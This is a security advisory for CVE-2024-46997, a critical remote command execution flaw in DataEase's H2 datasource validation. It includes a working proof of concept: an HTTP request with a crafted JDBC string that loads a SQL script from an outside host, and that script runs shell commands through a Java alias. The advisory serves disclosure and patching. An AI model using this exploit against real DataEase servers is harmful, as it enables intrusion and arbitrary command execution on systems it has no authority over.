# [C] DataEase's H2 datasource has a remote command execution risk

## Summary
Severity: Critical
Advisory: GHSA-h7mj-m72h-qm8w
CVE: CVE-2024-46997
CWE: CWE-74
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-09-23
Source: https://github.com/advisories/GHSA-h7mj-m72h-qm8w
Type: github-advisory

## Affected
- Maven: `io.dataease:common` — affected >=0 <2.10.1

## Details
### Impact
An attacker can achieve remote command execution by adding a carefully constructed h2 data source connection string.

request message:
```
POST /de2api/datasource/validate HTTP/1.1
Host: dataease.ubuntu20.vm
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
X-DE-TOKEN: jwt
Content-Length: 209
Content-Type: application/json

{
    "id": "",
    "name": "test",
    "type": "h2",
    "configuration": "eyJqZGJjIjogImpkYmM6aDI6bWVtOnRlc3Q7VFJBQ0VfTEVWRUxfU1lTVEVNX09VVD0zO0lOSVQ9UlVOU0NSSVBUIEZST00gJ2h0dHA6Ly8xMC4xNjguMTc0LjE6ODAwMC9wb2Muc3FsJzsifQ=="
}
```

h2 data source connection string:
```
// configuration
{
    "jdbc": "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '[http://10.168.174.1:8000/poc.sql'](http://10.168.174.1:8000/poc.sql%27);",
}
```

the content of poc.sql:
```
// poc.sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return "su18";}';CALL EXEC ('touch /tmp/jdbch2rce')
```

You can see that the file was created successfully in docker:
```
/tmp # ls -l jdbch2rce 
-rw-r--r--    1 root     root             0 Sep 16 22:02 jdbch2rce
```
Affected versions: <= 2.10.0

### Patches
The vulnerability has been fixed in v2.10.1.

### Workarounds
It is recommended to upgrade the version to v2.10.1.

### References
If you have any questions or comments about this advisory:

Open an issue in https://github.com/dataease/dataease
Email us at [wei@fit2cloud.com](mailto:wei@fit2cloud.com)

## References
- https://github.com/dataease/dataease/security/advisories/GHSA-h7mj-m72h-qm8w
- https://nvd.nist.gov/vuln/detail/CVE-2024-46997
- https://github.com/dataease/dataease
